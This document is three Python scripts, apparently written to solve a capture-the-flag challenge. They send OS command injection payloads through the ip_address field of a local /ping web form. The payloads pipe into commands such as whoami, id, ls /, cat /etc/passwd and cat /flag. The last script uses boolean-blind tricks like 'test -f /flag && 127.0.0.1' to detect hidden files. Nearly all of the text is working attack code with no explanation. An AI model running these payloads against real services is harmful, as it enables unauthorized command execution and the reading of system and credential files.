import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

print("FULL RESPONSE ANALYSIS")
print("=" * 70)

# Test different payloads and look for output reflection
payloads = [
    ("Just IP", "127.0.0.1"),
    ("With stderr redirect", "127.0.0.1 2>&1"),
    ("Echo hello", "127.0.0.1 | echo hello12345"),
    ("Echo into ping", "echo test | 127.0.0.1"),
    ("Hostname", "127.0.0.1 | hostname"),
    ("Whoami", "127.0.0.1 | whoami"),
    ("Cat passwd head", "127.0.0.1 | cat /etc/passwd | head -1"),
    ("Invalid IP", "999.999.999.999"),
    ("False cmd", "false"),
    ("Not exist cat", "cat /nonexistent_file_abc123"),
]

for desc, payload in payloads:
    resp = send_ping(payload)
    
    # Extract relevant parts
    # Look for any command output that might be reflected
    print(f"\n[+] {desc}")
    print(f"    Payload: {payload}")
    
    # Check if response contains specific output
    if "hello12345" in resp:
        print("    [*] FOUND: 'hello12345' in response - COMMAND OUTPUT REFLECTED!")
    if "test" in resp.lower() and desc == "Echo into ping":
        print("    [*] FOUND: 'test' in response - COMMAND OUTPUT REFLECTED!")
    if "root:" in resp:
        print("    [*] FOUND: 'root:' in response - /etc/passwd content!")
    
    # Show the key part of HTML
    # Find the result message area
    match = re.search(r'<div class="result[^"]*">(.*?)</div>', resp, re.DOTALL | re.I)
    if match:
        result_text = match.group(1).strip()
        print(f"    Result div: {result_text[:200]}")
    else:
        # Look for body content
        match = re.search(r'<body[^>]*>(.*?)</body>', resp, re.DOTALL | re.I)
        if match:
            body = match.group(1).strip()
            # Clean up whitespace
            body_clean = re.sub(r'\s+', ' ', body)
            print(f"    Body: {body_clean[:300]}")

print("\n" + "=" * 70)
print("Checking if output is in comment, hidden field, or JavaScript")
print("=" * 70)

# Check for different output locations
test_payload = "127.0.0.1 | echo 'UNIQUE_MARKER_12345'"
resp = send_ping(test_payload)

# Check various locations
if "UNIQUE_MARKER_12345" in resp:
    print("[*] Marker found in response!")
    # Find location
    lines = resp.split('\n')
    for i, line in enumerate(lines):
        if "UNIQUE_MARKER_12345" in line:
            print(f"    Line {i}: {line.strip()[:200]}")
else:
    print("[-] Marker NOT found in response")
    print("[-] Response is likely truly blind (no output)")

import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def extract_pre_content(text):
    """Extract content from <pre> tags"""
    match = re.search(r'<pre>(.*?)</pre>', text, re.DOTALL | re.I)
    if match:
        return match.group(1).strip()
    return None

print("COMMAND OUTPUT EXTRACTION TESTS")
print("=" * 70)

# Test if command output appears in the <pre> section
payloads = [
    ("Hostname", "127.0.0.1 | hostname"),
    ("Whoami", "127.0.0.1 | whoami"),
    ("PWD", "127.0.0.1 | pwd"),
    ("Echo test", "127.0.0.1 | echo 'COMMAND_OUTPUT_TEST'"),
    ("Cat /etc/hostname", "127.0.0.1 | cat /etc/hostname"),
    ("Cat /flag", "127.0.0.1 | cat /flag"),
    ("LS /", "127.0.0.1 | ls /"),
    ("LS /app", "127.0.0.1 | ls /app"),
    ("Date", "127.0.0.1 | date"),
    ("ID", "127.0.0.1 | id"),
]

for desc, payload in payloads:
    resp = send_ping(payload)
    pre_content = extract_pre_content(resp)
    
    print(f"\n[+] {desc}")
    print(f"    Payload: {payload}")
    print(f"    <pre> content: {pre_content}")
    
    # Look for any command-like output patterns
    interesting_patterns = [
        r'root', r'app', r'flag', r'COMMAND_OUTPUT', 
        r'passwd', r'home', r'bin', r'\w+\s+\w+\s+\d+',  # date-like
        r'uid=\d+',  # id-like
    ]
    for pattern in interesting_patterns:
        if re.search(pattern, pre_content or "", re.I):
            print(f"    [*] Matches pattern: {pattern}")

import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

print("BOOLEAN BLIND FILE EXISTENCE TESTS")
print("=" * 70)
print("Logic: test -f FILE && 127.0.0.1")
print("  If FILE exists: test returns 0 (true) → ping runs → REACHABLE")
print("  If FILE missing: test returns 1 (false) → ping doesn't run → UNREACHABLE")
print("=" * 70)

# Test the logic with known files
test_cases = [
    ("/etc/hostname EXISTS", "test -f /etc/hostname && 127.0.0.1"),
    ("/etc/passwd EXISTS", "test -f /etc/passwd && 127.0.0.1"),
    ("/NONEXISTENT_abc NOT EXISTS", "test -f /NONEXISTENT_abc && 127.0.0.1"),
    ("/nonexistent_file NOT EXISTS", "test -f /nonexistent_file_12345 && 127.0.0.1"),
    
    # Try flag paths
    ("/flag (target)", "test -f /flag && 127.0.0.1"),
    ("/flag.txt (target)", "test -f /flag.txt && 127.0.0.1"),
    ("/app/flag (target)", "test -f /app/flag && 127.0.0.1"),
    ("/root/flag (target)", "test -f /root/flag && 127.0.0.1"),
    ("/tmp/flag (target)", "test -f /tmp/flag && 127.0.0.1"),
]

for desc, payload in test_cases:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[!]" if "EXISTS" in desc and status == "REACHABLE" or "NOT EXISTS" in desc and status == "UNREACHABLE" else "[ ]"
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:35} -> {status:12}")

print("\n" + "=" * 70)
print("Alternative: [ -f FILE ] && 127.0.0.1 syntax")
print("=" * 70)

# Test with bracket syntax
test_cases_bracket = [
    ("/etc/hostname EXISTS", "[ -f /etc/hostname ] && 127.0.0.1"),
    ("/etc/passwd EXISTS", "[ -f /etc/passwd ] && 127.0.0.1"),
    ("/NONEXISTENT NOT EXISTS", "[ -f /NONEXISTENT_abc ] && 127.0.0.1"),
    ("/flag (target)", "[ -f /flag ] && 127.0.0.1"),
    ("/flag.txt (target)", "[ -f /flag.txt ] && 127.0.0.1"),
    ("/app/flag (target)", "[ -f /app/flag ] && 127.0.0.1"),
]

for desc, payload in test_cases_bracket:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:35} -> {status:12}")

print("\n" + "=" * 70)
print("Alternative: cat FILE && 127.0.0.1  (succeeds if readable)")
print("=" * 70)

test_cases_cat = [
    ("/etc/hostname EXISTS", "cat /etc/hostname && 127.0.0.1"),
    ("/etc/passwd EXISTS", "cat /etc/passwd && 127.0.0.1"),
    ("/NONEXISTENT NOT EXISTS", "cat /NONEXISTENT_abc && 127.0.0.1"),
    ("/flag (target)", "cat /flag && 127.0.0.1"),
    ("/flag.txt (target)", "cat /flag.txt && 127.0.0.1"),
]

for desc, payload in test_cases_cat:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:35} -> {status:12}")

